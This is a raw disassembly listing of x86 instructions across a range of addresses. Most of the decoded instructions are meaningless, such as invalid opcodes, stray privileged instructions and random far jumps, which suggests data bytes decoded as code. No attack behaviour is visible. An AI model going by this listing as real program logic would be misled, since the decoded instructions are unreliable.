  41f4d5:	jmp    DWORD PTR [ebx-0x10]
  41f4d8:	adc    BYTE PTR [edx],bh
  41f4da:	adc    DWORD PTR [ecx+0x4],esp
  41f4dd:	ins    DWORD PTR es:[edi],dx
  41f4de:	cs pop ds
  41f4e0:	adc    ebx,DWORD PTR [edi+0x3e]
  41f4e3:	leave  
  41f4e4:	and    DWORD PTR [esi+0x22],ebp
  41f4e7:	sbb    bl,BYTE PTR ds:0x28342a5f
  41f4ed:	push   ecx
	...
  41f516:	add    BYTE PTR [eax],al
  41f518:	sub    edx,esp
  41f51a:	or     al,0x75
  41f51c:	pop    ds
  41f51d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f51e:	push   ds
  41f51f:	pop    esp
  41f520:	stc    
  41f521:	mov    ds:0x141f721e,eax
  41f526:	xor    al,0x6d
  41f528:	loopne 0x41f4d9
  41f52a:	adc    BYTE PTR [edi-0x14],bl
  41f52d:	pop    edx
  41f52e:	dec    esp
  41f52f:	add    al,0xfa
  41f531:	mov    ebx,0x9f1e105a
  41f536:	inc    eax
  41f537:	push   ss
  41f538:	fnstsw WORD PTR [ebp-0x5c33e6ad]
  41f53e:	cli    
  41f53f:	add    edi,edx
  41f541:	mov    ebx,0x941e103a
  41f546:	inc    ebp
  41f547:	adc    eax,0x183bbab2
  41f54c:	pop    esi
  41f54d:	mov    ecx,DWORD PTR [eax]
  41f54f:	adc    BYTE PTR [esi-0x62ebd1a5],dl
  41f555:	lods   eax,DWORD PTR ds:[esi]
  41f556:	or     dl,bl
  41f558:	or     DWORD PTR [edi-0x538dc7e4],0xb79a1f0f
  41f562:	sbb    ebx,DWORD PTR [ecx]
  41f564:	mov    ?,WORD PTR [esi-0x47a0d7fb]
  41f56a:	cld    
  41f56b:	push   ss
  41f56c:	xchg   ecx,eax
  41f56d:	mov    ecx,0xb27303cb
  41f572:	ficomp DWORD PTR [esi]
  41f574:	pop    eax
  41f575:	scas   eax,DWORD PTR es:[edi]
  41f576:	xlat   BYTE PTR ds:[ebx]
  41f577:	adc    al,0x4c
  41f579:	mov    cl,0xda
  41f57b:	fld    DWORD PTR [eax]
	...
  41f5a5:	add    BYTE PTR [edi-0x4e],bl
  41f5a8:	aad    0x3
  41f5aa:	push   0xffffff9a
  41f5ac:	retf   0x7c1e
  41f5af:	xchg   edx,eax
  41f5b0:	fwait
  41f5b1:	add    ecx,DWORD PTR [edi]
  41f5b3:	mov    eax,0xba2b0fc5
  41f5b8:	cdq    
  41f5b9:	push   ds
  41f5ba:	or     bl,BYTE PTR [edx-0x6e03e176]
  41f5c0:	mov    ebx,0xb48d0503
  41f5c5:	add    ebp,edi
  41f5c7:	xchg   edi,eax
  41f5c8:	lods   eax,DWORD PTR ds:[esi]
  41f5c9:	das    
  41f5ca:	repz cdq 
  41f5cc:	cdq    
  41f5cd:	ds loop 0x41f56b
  41f5d0:	add    BYTE PTR [ebp-0x7b8e55e4],al
  41f5d6:	dec    edx
  41f5d7:	xchg   DWORD PTR [eax+eiz*2+0x52],edx
  41f5db:	mov    esp,0x871c504c
  41f5e0:	jns    0x41f60c
  41f5e2:	cld    
  41f5e3:	ja     0x41f62b
  41f5e5:	sbb    edi,ebp
  41f5e7:	push   0x46
  41f5e9:	adc    al,0x7a
  41f5eb:	js     0x41f624
  41f5ed:	cmc    
  41f5ee:	data16 ins BYTE PTR es:[edi],dx
  41f5f0:	aas    
  41f5f1:	sub    BYTE PTR [ebp+0x74],bh
  41f5f4:	inc    edx
  41f5f5:	sub    dh,BYTE PTR [eax+0x6c]
  41f5f8:	sub    ebx,ebp
  41f5fa:	adc    ch,BYTE PTR [ecx+0x36]
  41f5fd:	aad    0x7e
  41f5ff:	ins    DWORD PTR es:[edi],dx
  41f600:	xor    eax,0x356f092f
  41f605:	or     al,0x3a
  41f607:	mov    cl,BYTE PTR [ebp+0x2f]
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	dec    esi
  41f635:	mov    ?,WORD PTR [edi]
  41f637:	sbb    edi,DWORD PTR [edi-0x79]
  41f63a:	inc    ecx
  41f63b:	add    eax,0x471aa23
  41f640:	dec    ebp
  41f641:	xchg   DWORD PTR [eax+eiz*8+0x4d],edx
  41f645:	mov    esp,0x871fd04c
  41f64a:	jns    0x41f65c
  41f64c:	jg     0x41f6b6
  41f64e:	xor    edx,DWORD PTR [edi+ebp*8]
  41f651:	imul   esi,DWORD PTR [edi],0x32787f14
  41f657:	sti    
  41f658:	out    0x6b,al
  41f65a:	xor    eax,0x427488fc
  41f65f:	stos   BYTE PTR es:[edi],al
  41f660:	xor    BYTE PTR [eax+0x2b],0xac
  41f664:	jns    0x41f6d5
  41f666:	xor    dl,ah
  41f668:	arpl   WORD PTR [ebx+0x30],sp
  41f66b:	fisubr WORD PTR [ecx+ebp*2+0x41]
  41f66f:	mov    WORD PTR ds:0x40067ae,?
  41f675:	jnp    0x41f6dd
  41f677:	je     0x41f680
  41f679:	dec    ebp
  41f67a:	jb     0x41f6f2
  41f67c:	hlt    
  41f67d:	or     eax,0x5bbe6e66
  41f682:	jae    0x41f6ed
  41f684:	add    al,0x7a
  41f686:	data16 je 0x41f690
  41f689:	adc    DWORD PTR [esi+0x6e],esp
  41f68c:	(bad)  
  41f68d:	pop    esi
  41f68e:	inc    esi
  41f68f:	push   esp
  41f690:	pop    ss
  41f691:	jns    0x41f6fe
  41f693:	jns    0x41f68b
  41f695:	inc    edi
  41f696:	popa   
  41f697:	jb     0x41f699
	...
  41f6c1:	add    BYTE PTR [ecx],dh
  41f6c3:	dec    ecx
  41f6c4:	je     0x41f736
  41f6c6:	daa    
  41f6c7:	imul   edx,DWORD PTR [eax+edx*2+0x49],0x3861754e
  41f6cf:	jl     0x41f743
  41f6d1:	cs inc esi
  41f6d3:	jp     0x41f6d5
  41f6d5:	pop    esp
  41f6d6:	push   ebp
  41f6d7:	inc    edi
  41f6d8:	outs   dx,BYTE PTR gs:[esi]
  41f6da:	adc    BYTE PTR [edx+0x6b],ch
  41f6dd:	or     dx,WORD PTR [ecx]
  41f6e0:	pusha  
  41f6e1:	outs   dx,DWORD PTR ds:[esi]
  41f6e2:	xor    bl,BYTE PTR [edi+0x6e]
  41f6e5:	jae    0x41f6db
  41f6e7:	or     DWORD PTR [ebx],ebp
  41f6e9:	fs repz dec esi
  41f6ec:	add    BYTE PTR [esi-0x5c],cl
  41f6ef:	imul   ebx,DWORD PTR [ebx+0x49],0x7447f1
  41f6f6:	mov    eax,ds:0x945f4f69
  41f6fb:	inc    edx
  41f6fc:	jno    0x41f772
  41f6fe:	sti    
  41f6ff:	dec    ebp
  41f700:	jae    0x41f770
  41f702:	xlat   BYTE PTR ds:[ebx]
  41f703:	jo     0x41f754
  41f705:	push   ebx
  41f706:	in     eax,0x7f
  41f708:	outs   dx,DWORD PTR ds:[esi]
  41f709:	gs test eax,0xba445c16
  41f70f:	jns    0x41f77c
  41f711:	fs mov edx,0x3e66719c
  41f717:	(bad)  
  41f718:	pop    ds
  41f719:	jb     0x41f759
  41f71b:	loope  0x41f75c
  41f71d:	inc    ecx
  41f71e:	test   edi,0xfde14b3f
  41f724:	push   cs
  41f725:	arpl   WORD PTR [eax],ax
	...
  41f74f:	add    bl,ah
  41f751:	cli    
  41f752:	or     al,0x63
  41f754:	jecxz  0x41f789
  41f756:	xor    DWORD PTR [ecx+0x2f],ecx
  41f759:	inc    ebx
  41f75a:	and    eax,DWORD PTR [ebp-0x25]
  41f75d:	(bad)  
  41f75e:	cmp    DWORD PTR [esi-0x2e],ebp
  41f761:	xchg   esi,eax
  41f762:	adc    ch,BYTE PTR [esi-0x21]
  41f765:	addr16 aaa 
  41f767:	arpl   di,ax
  41f769:	inc    eax
  41f76a:	sbb    BYTE PTR [ebp-0x36],ch
  41f76d:	xor    esi,DWORD PTR [ecx]
  41f76f:	dec    ecx
  41f770:	outs   dx,DWORD PTR ds:[esi]
  41f771:	and    esp,DWORD PTR [edi+edi*1]
  41f774:	stos   DWORD PTR es:[edi],eax
  41f775:	jo     0x41f793
  41f777:	arpl   WORD PTR [eax-0x609ee6b8],bx
  41f77d:	push   eax
  41f77e:	sbb    eax,0xd1796e00
  41f783:	cs ins DWORD PTR es:[edi],dx
  41f785:	xor    BYTE PTR [edx],0x5d
  41f788:	adc    BYTE PTR [edi+0x1f],0x72
  41f78c:	xchg   DWORD PTR [ecx*1-0x2e867200],esp
  41f793:	cs xchg ecx,eax
  41f795:	jle    0x41f7a9
  41f797:	arpl   WORD PTR [ebx-0x1f],sp
  41f79a:	adc    al,0x6d
  41f79c:	push   0x34
  41f79e:	add    DWORD PTR [eax],eax
  41f7a0:	ds xor al,0x1
  41f7a3:	add    BYTE PTR [esi],bh
  41f7a5:	xor    al,0x1
  41f7a7:	add    BYTE PTR [esi],bh
  41f7a9:	xor    al,0x1
  41f7ab:	add    BYTE PTR [esi],bh
  41f7ad:	xor    al,0x1
  41f7af:	add    BYTE PTR [esi],bh
  41f7b1:	xor    al,0x1
	...
  41f7db:	add    BYTE PTR [eax],al
  41f7dd:	add    BYTE PTR [esi],bh
  41f7df:	xor    al,0x1
  41f7e1:	add    BYTE PTR [esi],bh
  41f7e3:	pop    ebx
  41f7e4:	out    0x3,eax
  41f7e6:	ds pop ebx
  41f7e8:	out    0x3,eax
  41f7ea:	shrd   DWORD PTR [ebx-0x253ff5e6],eax,0xd5
  41f7f2:	sbb    eax,0xf0393b7
  41f7f7:	lods   al,BYTE PTR ds:[esi]
  41f7f8:	mov    ebx,DWORD PTR [edx]
  41f7fa:	repnz mov edi,0xaae324ba
  41f800:	test   BYTE PTR ds:0x1858aa3e,dl
  41f806:	fldcw  WORD PTR [esi-0x46052ebc]
  41f80c:	inc    ebx
  41f80d:	adc    eax,0x10e7bfcf
  41f812:	fnstenv [esi+0x69dd1050]
  41f818:	push   ds
  41f819:	adc    al,0xac
  41f81b:	mov    esi,0xbeac2337
  41f820:	out    0x10,eax
  41f822:	cdq    
  41f823:	mov    bh,0x10
  41f825:	adc    BYTE PTR [ebp-0x6deec198],bl
  41f82b:	mov    esi,0xaa8f0417
  41f830:	sti    
  41f831:	sbb    dl,BYTE PTR [edx-0x60db4542]
  41f837:	mov    ah,0xb
  41f839:	pcmpgtw mm6,QWORD PTR [ebp-0x5096ddea]
  41f840:	add    al,0x11
	...
  41f86a:	add    BYTE PTR [eax],al
  41f86c:	ds test al,0xd8
  41f86f:	pop    ss
  41f870:	pop    ecx
  41f871:	scas   eax,DWORD PTR es:[edi]
  41f872:	(bad)  
  41f873:	sar    BYTE PTR [edx-0x48],1
  41f876:	(bad)  
  41f877:	pop    ss
  41f878:	dec    ebp
  41f879:	mov    dh,0xbd
  41f87b:	and    al,0x5c
  41f87d:	mov    bh,0xd6
  41f87f:	and    DWORD PTR [esi],edi
  41f881:	pop    ebx
  41f882:	int3   
  41f883:	adc    al,0x34
  41f885:	test   al,0x0
  41f887:	mov    eax,0xc474bc49
  41f88c:	mov    ?,WORD PTR [esi+0x64]
  41f88f:	xchg   ebp,eax
  41f890:	dec    ecx
  41f891:	pop    ebx
  41f892:	jno    0x41f82c
  41f894:	xor    DWORD PTR [esp+esi*2+0x6d876e8c],edi
  41f89b:	cdq    
  41f89c:	sub    BYTE PTR [ebp-0x48d38600],dh
  41f8a2:	addr16 jne 0x41f8fd
  41f8a5:	push   0x5d
  41f8a7:	mov    cl,BYTE PTR [ecx-0x4a]
  41f8aa:	jno    0x41f830
  41f8ac:	cmp    eax,0x53556faa
  41f8b1:	test   al,0x63
  41f8b3:	sbb    bl,BYTE PTR [ebp-0x4c]
  41f8b6:	jb     0x41f904
  41f8b8:	dec    edx
  41f8b9:	test   DWORD PTR [edx+0x44],esi
  41f8bc:	inc    edx
  41f8bd:	stos   BYTE PTR es:[edi],al
  41f8be:	outs   dx,DWORD PTR ds:[esi]
  41f8bf:	push   ebp
  41f8c0:	push   ebx
  41f8c1:	test   al,0x63
  41f8c3:	cli    
  41f8c4:	sbb    al,0xab
  41f8c6:	je     0x41f914
  41f8c8:	sub    ah,BYTE PTR [edx+esi*2]
  41f8cb:	cmp    BYTE PTR [esi],ch
  41f8cd:	mov    ebp,0xc74
	...
  41f8fa:	imul   eax,DWORD PTR [esi-0x56f1f19f],0xba1d076b
  41f904:	ja     0x41f91b
  41f906:	pop    ss
  41f907:	stos   DWORD PTR es:[edi],eax
  41f908:	add    dl,bh
  41f90a:	or     dh,BYTE PTR [eax+0x6ae6f567]
  41f910:	pop    ebp
  41f911:	or     ch,ch
  41f913:	scas   eax,DWORD PTR es:[edi]
  41f914:	jae    0x41f912
  41f916:	out    dx,eax
  41f917:	xchg   BYTE PTR [edx-0x2b],ah
  41f91a:	in     al,dx
  41f91b:	mov    ecx,0x5b3de900
  41f920:	add    cl,ch
  41f922:	cmp    eax,0x3de9005b
  41f927:	pop    ebx
  41f928:	add    BYTE PTR [eax],al
  41f92a:	xlat   BYTE PTR ds:[ebx]
  41f92b:	push   edi
  41f92c:	add    BYTE PTR [eax],al
  41f92e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f92f:	push   edi
  41f930:	add    BYTE PTR [eax],al
  41f932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f933:	push   edi
  41f934:	add    BYTE PTR [eax],al
  41f936:	xchg   edi,eax
  41f937:	push   edi
  41f938:	add    BYTE PTR [eax],al
  41f93a:	xchg   edi,eax
  41f93b:	push   edi
  41f93c:	add    BYTE PTR [eax],al
  41f93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f93f:	daa    
  41f940:	outs   dx,DWORD PTR ds:[esi]
  41f941:	outs   dx,DWORD PTR ds:[esi]
  41f942:	shl    DWORD PTR [esi],0x69
  41f945:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f947:	imul   esp,DWORD PTR [ebp+0x6e],0x725057ae
  41f94e:	enter  0x6631,0x6c
  41f952:	ret    0x4557
  41f955:	jae    0x41f91c
  41f957:	xor    ch,BYTE PTR [ecx+0x61]
  41f95a:	add    esi,DWORD PTR [esi]
  41f95c:	jae    0x41f9c3
	...
  41f986:	add    BYTE PTR [eax],al
  41f988:	addr16 pop es
  41f98a:	pop    esi
  41f98b:	je     0x41f98c
  41f98d:	pop    esi
  41f98e:	push   eax
  41f98f:	popa   
  41f990:	repz ss push ecx
  41f993:	outs   dx,DWORD PTR ds:[esi]
  41f994:	adc    ah,BYTE PTR [edi]
  41f996:	bound  eax,QWORD PTR [eax]
  41f998:	ja     0x41f9c3
  41f99a:	bound  esp,QWORD PTR [esi+0x74]
  41f99d:	ins    DWORD PTR es:[edi],dx
  41f99e:	push   0x73
  41f9a0:	pop    ss
  41f9a1:	sub    ah,BYTE PTR [esi+0x67]
  41f9a4:	dec    ecx
  41f9a5:	imul   esi,DWORD PTR cs:[ebx+0x9],0x2a
  41f9aa:	outs   dx,BYTE PTR ds:[esi]
  41f9ab:	ins    BYTE PTR es:[edi],dx
  41f9ac:	and    esp,DWORD PTR ds:[edx+0x0]
  41f9b0:	and    al,0x30
  41f9b2:	outs   dx,BYTE PTR fs:[esi]
  41f9b4:	sub    BYTE PTR ds:0x26f32e70,ch
  41f9ba:	jno    0x41f9bc
  41f9bc:	hlt    
  41f9bd:	das    
  41f9be:	outs   dx,BYTE PTR fs:[esi]
  41f9c0:	call   0x497469f1
  41f9c5:	and    esi,DWORD PTR [ebp+0x74]
  41f9c8:	out    0x29,eax
  41f9ca:	data16 addr16 ds sbb dh,dl
  41f9cf:	ins    DWORD PTR es:[edi],dx
  41f9d0:	dec    ebp
  41f9d1:	inc    ebp
  41f9d2:	xor    dh,BYTE PTR [esi+eax*2-0x20]
  41f9d6:	add    BYTE PTR [ecx],ah
  41f9d8:	ins    BYTE PTR es:[edi],dx
  41f9d9:	adc    eax,0x106c2101
  41f9de:	add    DWORD PTR [ecx],esp
  41f9e0:	ins    BYTE PTR es:[edi],dx
  41f9e1:	pop    ss
  41f9e2:	add    DWORD PTR [ecx-0x5],edx
  41f9e5:	out    0xc7,eax
  41f9e7:	inc    eax
  41f9e8:	repnz adc ebp,ecx
  41f9eb:	ins    BYTE PTR es:[edi],dx
	...
  41fa14:	add    BYTE PTR [eax],al
  41fa16:	or     eax,0x1b5eeec0
  41fa1b:	xlat   BYTE PTR ds:[ebx]
  41fa1c:	sub    al,0x20
  41fa1e:	sbb    ecx,edx
  41fa20:	in     eax,0x71
  41fa22:	mul    DWORD PTR [ebx-0x41259d0b]
  41fa28:	cmc    
  41fa29:	(bad)  
  41fa2a:	in     al,dx
  41fa2b:	mov    eax,ds:0x47db6ae4
  41fa30:	and    al,0x63
  41fa32:	call   0xceb8f0cb
  41fa37:	jg     0x41fa1e
  41fa39:	arpl   si,bp
  41fa3b:	xchg   edx,eax
  41fa3c:	repz jo 0x41fa08
  41fa3f:	mov    dh,dh
  41fa41:	arpl   WORD PTR [esi+0x7a],bx
  41fa44:	(bad)  
  41fa45:	dec    esp
  41fa46:	adc    DWORD PTR [ebp+ebp*8+0x6c],0xffffffa4
  41fa4b:	push   ecx
  41fa4c:	lock ins BYTE PTR es:[edi],dx
  41fa4e:	cdq    
  41fa4f:	dec    ebx
  41fa50:	bnd jo 0x41fa91
  41fa53:	jp     0x41fa3e
  41fa55:	jno    0x41f9f2
  41fa57:	push   edx
  41fa58:	out    dx,eax
  41fa59:	ja     0x41fa99
  41fa5b:	jo     0x41fa2a
  41fa5d:	ins    BYTE PTR es:[edi],dx
  41fa5e:	test   BYTE PTR [ebx-0x10],cl
  41fa61:	imul   ebx,DWORD PTR [edi+0x40],0xffffffca
  41fa65:	data16 ins BYTE PTR es:[edi],dx
  41fa67:	dec    edi
  41fa68:	jmp    0x5151:0x450666c
  41fa6f:	pop    ebx
  41fa70:	int    0xf7
  41fa72:	push   edx
  41fa73:	mov    esp,0x9075e6d9
  41fa78:	(bad)  
  41fa79:	std    
	...
  41faa2:	add    BYTE PTR [eax],al
  41faa4:	pusha  
  41faa5:	scas   eax,DWORD PTR es:[edi]
  41faa6:	mov    ebx,0x146ec1e2
  41faab:	das    
  41faac:	ds mov ecx,0x7277f3b3
  41fab2:	push   es
  41fab3:	add    al,0x16
  41fab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab6:	mov    bl,0xf3
  41fab8:	addr16 jb 0x41fa91
  41fabb:	add    esp,DWORD PTR [esi]
  41fabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fabe:	xchg   ebx,eax
  41fabf:	repz push cs
  41fac1:	gs (bad) 
  41fac3:	xor    BYTE PTR [esi],bh
  41fac5:	mov    ecx,0x5b53f393
  41faca:	(bad)  
  41facb:	jmp    0xae01:0xd7a5b7ef
  41fad2:	xor    bh,0xdc
  41fad5:	lods   eax,DWORD PTR ds:[esi]
  41fad6:	mov    ebp,0xe7a700e7
  41fadb:	aam    0xdc
  41fadd:	mov    ebx,0xb5e3f12c
  41fae2:	dec    esp
  41fae3:	sti    
  41fae4:	dec    ecx
  41fae5:	test   DWORD PTR [ecx+esi*8],ebx
  41fae8:	(bad)  
  41fae9:	mov    bl,0x53
  41faeb:	lock cwde 
  41faed:	jg     0x41fb09
  41faef:	out    0x90,eax
  41faf1:	mov    es,WORD PTR [esi-0xe]
  41faf4:	xchg   esi,eax
  41faf5:	mov    dh,0x30
  41faf7:	loopne 0x41fb1a
  41faf9:	xchg   edi,eax
  41fafa:	adc    esi,ecx
  41fafc:	sahf   
  41fafd:	mov    ah,0xe7
  41faff:	fistp  QWORD PTR [ebx-0x51]
  41fb02:	push   es
  41fb03:	in     eax,0x96
  41fb05:	jg     0x41fb30
  41fb07:	test   BYTE PTR [eax],0x0
	...
  41fb32:	xchg   edx,eax
  41fb33:	test   al,0xfa
  41fb35:	out    0x6f,al
  41fb37:	jg     0x41fb20
  41fb39:	into   
  41fb3a:	bound  esp,QWORD PTR [ebp-0x4b120000]
  41fb40:	pop    edi
  41fb41:	jmp    0xe3af9147
  41fb46:	in     al,0xb4
  41fb48:	ins    BYTE PTR es:[edi],dx
  41fb49:	enter  0x90f1,0x72
  41fb4d:	(bad)  
  41fb4e:	xlat   BYTE PTR ds:[ebx]
  41fb4f:	mov    ecx,0x84cac46c
  41fb54:	add    BYTE PTR [edx-0x498b4952],bl
  41fb5a:	pushf  
  41fb5b:	stos   BYTE PTR es:[edi],al
  41fb5c:	arpl   WORD PTR [ebp-0x359c4287],dx
  41fb62:	xchg   ebp,eax
  41fb63:	xchg   esi,eax
  41fb64:	push   esp
  41fb65:	mov    ecx,0x9970603d
  41fb6a:	jns    0x41fb25
  41fb6c:	jb     0x41fb57
  41fb6e:	jns    0x41fb1f
  41fb70:	popa   
  41fb71:	mov    BYTE PTR [ecx+0x3d7b679c],dl
  41fb77:	mov    ebp,0xb5628e6d
  41fb7c:	pop    edi
  41fb7d:	jnp    0x41fbd9
  41fb7f:	outs   dx,BYTE PTR ds:[esi]
  41fb80:	mov    BYTE PTR fs:[ecx+0x20],ch
  41fb84:	push   edx
  41fb85:	push   eax
  41fb86:	push   esi
  41fb87:	mov    ebp,0xaf584f47
  41fb8c:	cmp    BYTE PTR cs:[eax+0x561e0090],al
  41fb93:	mov    ecx,0xe96e
	...
  41fbc0:	add    eax,DWORD PTR [ecx-0x46d3b18a]
  41fbc6:	je     0x41fc14
  41fbc8:	sub    eax,0x2648646e
  41fbcd:	and    BYTE PTR [esi+0x10],dl
  41fbd0:	sub    BYTE PTR [esi-0x55c5c6ac],dl
  41fbd6:	addr16 sbb eax,0x52eab17
  41fbdc:	sbb    al,0x20
  41fbde:	inc    edx
  41fbdf:	add    BYTE PTR [ebx],dh
  41fbe1:	or     al,0x46
  41fbe3:	inc    esp
  41fbe4:	push   ebx
  41fbe5:	and    al,0x2e
  41fbe7:	xor    DWORD PTR [esi+eiz*2],edx
  41fbea:	inc    esp
  41fbeb:	aaa    
  41fbec:	stos   DWORD PTR es:[edi],eax
  41fbed:	sub    WORD PTR [ecx+0x1e],ax
  41fbf1:	bound  eax,QWORD PTR [edx+0x2d]
  41fbf4:	ss data16 xor al,BYTE PTR fs:[edx+0x5f]
  41fbfa:	cmp    eax,0x306a2738
  41fbff:	xor    BYTE PTR [edi],bh
  41fc01:	addr16 cmp eax,0x326ce544
  41fc07:	inc    esi
  41fc08:	fldenv [edi+0x79]
  41fc0b:	pop    esp
  41fc0c:	fisubr WORD PTR ds:0x3cb0724d
  41fc12:	push   eax
  41fc13:	gs mov ch,0x25
  41fc16:	bound  esi,QWORD PTR [edx+0x64]
  41fc19:	imul   eax,DWORD PTR [eax],0x7329ba73
  41fc1f:	gs cmc 
  41fc21:	sub    al,0x2b
  41fc23:	js     0x41fc25
	...
  41fc4d:	add    dl,al
  41fc4f:	das    
  41fc50:	std    
  41fc51:	pop    ebx
  41fc52:	cdq    
  41fc53:	pop    es
  41fc54:	dec    ebp
  41fc55:	inc    edi
  41fc56:	mov    edx,0xf5657127
  41fc5b:	push   esi
  41fc5c:	inc    ecx
  41fc5d:	push   ebx
  41fc5e:	or     esi,DWORD PTR [ebx]
  41fc60:	pop    edi
  41fc61:	xor    al,BYTE PTR [ecx+0x33]
  41fc64:	pop    esi
  41fc65:	je     0x41fcbe
  41fc67:	push   es
  41fc68:	inc    ecx
  41fc69:	popa   
  41fc6a:	jnp    0x41fca4
  41fc6c:	sub    esp,DWORD PTR [esi+eax*4+0x23]
  41fc70:	std    
  41fc71:	pop    ebx
  41fc72:	pop    edx
  41fc73:	sub    dh,BYTE PTR [ecx+0x73]
  41fc76:	pusha  
  41fc77:	xor    eax,0xb665c71
  41fc7c:	inc    ebx
  41fc7d:	push   esp
  41fc7e:	push   edi
  41fc7f:	push   edi
  41fc80:	inc    ebp
  41fc81:	outs   dx,BYTE PTR ds:[esi]
  41fc82:	ds inc eax
  41fc84:	out    0x71,eax
  41fc86:	nop
  41fc87:	push   edi
  41fc88:	clc    
  41fc89:	pop    ds
  41fc8a:	sbb    DWORD PTR [esp+esi*8+0x6b],0x61
  41fc8f:	and    ch,al
  41fc91:	jno    0x41fcd1
  41fc93:	cmp    eax,0x1e576deb
  41fc98:	call   0xe2557a10
  41fc9d:	addr16 pop ebx
  41fc9f:	icebp  
  41fca0:	out    dx,al
  41fca1:	bound  esp,QWORD PTR [edx+0xf]
  41fca4:	jmp    0x41fd19
  41fca6:	push   edi
  41fca7:	adc    ebp,ebp
  41fca9:	jo     0x41fce9
  41fcab:	out    0xd1,eax
  41fcad:	pop    ds
  41fcae:	pop    es
  41fcaf:	mul    DWORD PTR [eax]
  41fcb1:	inc    esi
	...
  41fcda:	add    BYTE PTR [eax],al
  41fcdc:	adc    al,ah
  41fcde:	and    BYTE PTR [eax+0x1f],dl
  41fce1:	loope  0x41fcd4
  41fce3:	je     0x41fd0e
  41fce5:	ret    0x70e4
  41fce8:	ds clc 
  41fcea:	sar    BYTE PTR [esi],1
  41fcec:	out    dx,al
  41fced:	cli    
  41fcee:	and    BYTE PTR ss:[esi],bh
  41fcf1:	hlt    
  41fcf2:	(bad)  
  41fcf3:	xor    al,0x3a
  41fcf5:	push   eax
  41fcf6:	mov    bh,0xcd
  41fcf8:	dec    edi
  41fcf9:	pop    ebp
  41fcfa:	add    BYTE PTR [eax],al
  41fcfc:	xchg   esp,eax
  41fcfd:	xor    al,0xec
  41fcff:	inc    ebp
  41fd00:	push   eax
  41fd01:	repz (bad) 
  41fd03:	xor    al,0x1a
  41fd05:	adc    BYTE PTR [edx-0x342d033],bh
  41fd0b:	call   DWORD PTR [edi+0x5045ea34]
  41fd11:	jb     0x41fcdd
  41fd13:	xor    al,0x7a
  41fd15:	adc    BYTE PTR [edx-0x262b033],bh
  41fd1b:	call   edi
  41fd1d:	xor    ebp,edx
  41fd1f:	inc    ebp
  41fd20:	adc    BYTE PTR ds:0x5b3e0001,ch
  41fd26:	int3   
  41fd27:	xor    ecx,DWORD PTR [ebx+eax*4-0x19]
  41fd2b:	rcr    BYTE PTR [edx+0x60f51bb5],1
  41fd31:	test   eax,0xb484e004
  41fd36:	or     dh,dl
  41fd38:	bound  ebp,QWORD PTR [edx+0x7f6de60e]
  41fd3e:	and    dh,ch
	...
  41fd68:	add    BYTE PTR [eax],al
  41fd6a:	ins    DWORD PTR es:[edi],dx
  41fd6b:	mov    eax,0xa75cedf9
  41fd70:	pop    es
  41fd71:	(bad)  
  41fd72:	dec    ecx
  41fd73:	stos   DWORD PTR es:[edi],eax
  41fd74:	retf   
  41fd75:	in     al,dx
  41fd76:	dec    edi
  41fd77:	mov    eax,0xad78dfd9
  41fd7c:	shl    esi,cl
  41fd7e:	and    eax,0x22c5d0af
  41fd83:	test   eax,0x8a05f0cc
  41fd88:	mov    ebx,0xc6bc2fec
  41fd8d:	out    0x4f,al
  41fd8f:	pop    ebx
  41fd90:	out    0x3,eax
  41fd92:	ds pop ebx
  41fd94:	mov    BYTE PTR [ebx],al
  41fd96:	sbb    al,0x5b
  41fd98:	mov    WORD PTR [ebx],es
  41fd9a:	dec    esp
  41fd9b:	pop    ebx
  41fd9c:	iret   
  41fd9d:	add    esi,DWORD PTR [eax]
  41fd9f:	pop    ebx
  41fda0:	rol    BYTE PTR [ebx],0xd8
  41fda3:	pop    edx
  41fda4:	int3   
  41fda5:	add    esi,DWORD PTR [ecx]
  41fda7:	pop    ebx
  41fda8:	mov    DWORD PTR [ebx],eax
  41fdaa:	sub    bl,BYTE PTR [ebx-0x4a]
  41fdad:	add    esp,DWORD PTR ds:0xdf041b5b
  41fdb3:	pop    edx
  41fdb4:	inc    ebx
  41fdb5:	add    al,0x11
  41fdb7:	pop    ebx
  41fdb8:	add    al,0x4
  41fdba:	loope  0x41fe16
  41fdbc:	sbb    al,BYTE PTR [ebp*2+0x6503ff5b]
  41fdc3:	pop    ebx
  41fdc4:	dec    edx
  41fdc5:	add    al,0x6c
  41fdc7:	pop    ebx
  41fdc8:	add    bl,bh
  41fdca:	cmp    eax,0xf90064
	...
  41fdf7:	add    BYTE PTR ds:0x3a0d0067,bh
  41fdfd:	mov    ecx,0x66420800
  41fe02:	add    BYTE PTR [edi],cl
  41fe04:	cmp    ah,BYTE PTR [esi+0x0]
  41fe07:	jmp    0xaa98e49
  41fe0c:	in     al,dx
  41fe0d:	scas   eax,DWORD PTR es:[edi]
  41fe0e:	jno    0x41fe1e
  41fe10:	loopne 0x41fdba
  41fe12:	pop    ebp
  41fe13:	push   ds
  41fe14:	aad    0xae
  41fe16:	inc    edi
  41fe17:	jmp    eax
  41fe19:	test   al,0x5d
  41fe1b:	adc    edi,DWORD PTR [edx]
  41fe1d:	mov    ch,0x74
  41fe1f:	fld    DWORD PTR [edi]
  41fe21:	outs   dx,BYTE PTR ds:[esi]
  41fe22:	sub    eax,0x66afeee9
  41fe27:	aad    0xb2
  41fe29:	jge    0x41fe9d
  41fe2b:	int3   
  41fe2c:	xchg   ecx,eax
  41fe2d:	pop    ebp
  41fe2e:	fs into 
  41fe30:	lahf   
  41fe31:	mov    ecx,0xb192aa5c
  41fe36:	imul   edi,DWORD PTR [esi-0x6fade355],0xffffff89
  41fe3d:	mov    ecx,0xa68f8451
  41fe42:	arpl   WORD PTR [ebx-0x7fade372],bx
  41fe48:	jno    0x41fe03
  41fe4a:	push   ecx
  41fe4b:	mov    WORD PTR [edi-0x5a],gs
  41fe4e:	arpl   WORD PTR [ebx+0x1d],di
  41fe51:	js     0x41feb7
  41fe53:	xchg   ebp,eax
  41fe54:	jne    0x41fe05
  41fe56:	jno    0x41fecd
  41fe58:	cmp    eax,0x5d678a
	...
  41fe85:	add    BYTE PTR [edi-0x75],bl
  41fe88:	arpl   WORD PTR [ebx+0x4c],bx
